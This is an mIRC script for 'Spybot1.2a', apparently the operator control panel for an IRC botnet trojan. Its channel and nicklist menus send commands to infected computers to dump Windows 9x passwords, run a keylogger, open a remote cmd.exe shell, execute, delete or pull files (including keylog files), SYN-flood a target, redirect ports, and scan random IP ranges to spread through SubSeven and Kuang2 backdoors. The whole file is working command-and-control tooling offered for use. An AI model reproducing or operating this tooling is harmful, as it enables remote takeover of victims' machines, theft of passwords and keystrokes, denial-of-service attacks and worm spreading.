;//////////////////////////////////////////////////////////
;//							//
;//		Spybot1.2a by Mich			//
;//							//
;//		Opensource irc bot 			//
;//							//
;//	    IRC: irc.babbels.com #dreams		//
;//	    						//
;//		use at your own risk.			//
;//							//
;//	       Good luck and have fun!			//
;//							//
;//////////////////////////////////////////////////////////

menu channel {
  &SpyBot1.2
  .&Login: msg # login $$?"Enter Password"
  .-
  .&Computer Info: msg # info
  .Win 9x &Passwords: msg # passwords
  .-
  .List &Threads: msg # threads
  .Kill &Thread: msg # killthread $$?"Enter thread number"
  .-
  .Start &Keylogger: msg # startkeylogger
  .Stop &Keylogger: msg # stopkeylogger
  .-
  .List &Processes:msg #  listprocesses
  .Kill &Process: msg # killprocess $$?"Enter Process name (example: taskmgr.exe)"
  .-
  .&Disconnect for x sec.:msg # disconnect $$?"Enter time to disconnect in sec."
  .&Reconnect: msg # reconnect
  .&Quit: msg # quit
  .&Reboot windows: msg # reboot
  .-
  .&HTTP Server: msg # httpserver $$?"Enter port and rootdir (example: 81 c:\)"
  .-
 .Port Redirect: msg # redirect $$?"Enter input port output host output port (example: 100 eu.undernet.org 6667)"
 .-
  .&Raw Commands: msg # raw $$?"Enter raw command (example PRIVMSG #spybot1.1 :hello master)"
  .-
  .&Portscanner: msg # scan $$?"Enter Startip (0 for random) poort delay [filename] (example 0 139 2 portscan.txt)"
  .-
 .&Syn Flood: msg # syn $$?"Enter target port delay times (example 127.0.0.1 80 100 1000)"
 .-
  .&File manager
  ..List &Files: msg # list $$?"Enter Filter (example: C:\*.*) "
  ..Delete &File: msg # delete $$?"Enter path+filename (example C:\windows\netstat.exe) "
  ..Rename &File: msg # rename $$?"Enter oldfilename newfilename (example C:\netstat.exe C:\netstatbackup.exe)"
  ..Execute &File: msg # execute $$?"Enter filename to execute (example C:\windows\server.exe)"
  ..Make Dir: msg # makedir $$?"Enter name of the new dir (example C:\windows\newdir\)"
  .&misc
  ..&Send Keys: msg # sendkeys $$?"Enter keys (ctrl+b for enter and ctrl+u for backspace)"
  ..&Flash keyboardlights: msg # keyboardlights
  ..Open CD-rom: msg # cd-rom 1
  ..Close CD-rom: msg # cd-rom 0
  ..SubSeven Spreader: msg # scan $$?"Enter Startip (0 for random) poort delay   (example 0 1243 2)" sub7
  ..Kuang2 Spreader: msg # scan $$?"Enter Startip (0 for random) poort delay  (example 0 17300 2)"  kuang
}
menu nicklist,query {
  &SpyBot1.2
  .&Login: msg $$* login $$?"Enter Password"
  .-
  .&Computer Info: msg $$*  info
  .Win 9x &Passwords: msg $$*  passwords
  .-
  .List &Threads: msg $$*  threads
  .Kill &Thread: msg $$* killthread $$?"Enter thread number"
  .-
  .Start &Keylogger: msg $$* startkeylogger
  .Stop &Keylogger: msg $$* stopkeylogger
  .-
  .List &Processes:msg $$*  listprocesses
  .Kill &Process: msg $$* killprocess $$?"Enter Process name (example: taskmgr.exe)"
  .-
  .&Disconnect for x sec.:msg $$* disconnect $$?"Enter time to disconnect in sec."
  .&Reconnect: msg $$* reconnect
  .&Quit: msg $$* quit
  .&Reboot windows: msg $$* reboot
  .-
  .&HTTP Server: msg $$* httpserver $$?"Enter port and rootdir (example: 81 c:\)"
  .-
 .Port Redirect: msg $$* redirect $$?"Enter input port output host output port (example: 100 eu.undernet.org 6667)"
.-
  .&Raw Commands: msg $$* raw $$?"Enter raw command (example PRIVMSG #spybot1.1 :hello master)"
  .-
  .&Portscanner: msg $$* scan $$?"Enter Startip (0 for random) poort delay  [filename] (example 0 139 2 portscan.txt)"
  .-
  .&Syn Flood: msg $$* syn $$?"Enter target port delay times (example 127.0.0.1 80 100 1000)"
  .-
  .DCC
  ..Dcc Send &File..:dcc send $$1
  ..Get &File: msg $$1 get $$?"Enter filename to get (example C:\windows\system\keylogs.dll)"
  ..Dcc Chat..: dcc chat $$1
  .-
  .&File manager
  ..List &Files: msg $$* list $$?"Enter Filter (example: C:\*.*) "
  ..Delete &File: msg $$* delete $$?"Enter path+filename (example C:\windows\netstat.exe) "
  ..Rename &File: msg $$* rename $$?"Enter oldfilename newfilename (example C:\netstat.exe C:\netstatbackup.exe)"
  ..Execute &File: msg $$* execute $$?"Enter filename to execute (example C:\windows\server.exe)"
  ..Make Dir: msg $$* makedir $$?"Enter name of the new dir (example C:\windows\newdir\)"
  .&Remote cmd.exe
  ..Start cmd: msg $$* opencmd
  ..Send command to cmd: msg $$* cmd $$?"Enter command (example netstat -an)"
  ..Close Cmd: msg $$* cmd exit
  .&misc
  ..&Send Keys: msg $$* sendkeys $$?"Enter keys (ctrl+b for enter and ctrl+u for backspace)"
  ..&Flash keyboardlights: msg $$* keyboardlights
  ..Open CD-rom: msg $$* cd-rom 1
  ..Close CD-rom: msg $$* cd-rom 0
  ..SubSeven Spreader: msg $$* scan $$?"Enter Startip (0 for random) poort delay   (example 0 1243 2)" sub7
  ..Kuang2 Spreader: msg $$* scan $$?"Enter Startip (0 for random) poort delay  (example 0 17300 2)"  kuang
}

;simpel encryption fuctie

alias encrypt {
  var %k = $1
  var %c 1
  var %x
  while (%c <= $len($2-)) {
    %x =  %x $+ $chr($calc($asc($mid($2-,%c,1)) + %k + (%c - 1) * 3)) 
    inc %c
  }
  echo -s %x
  clipboard %x 
}
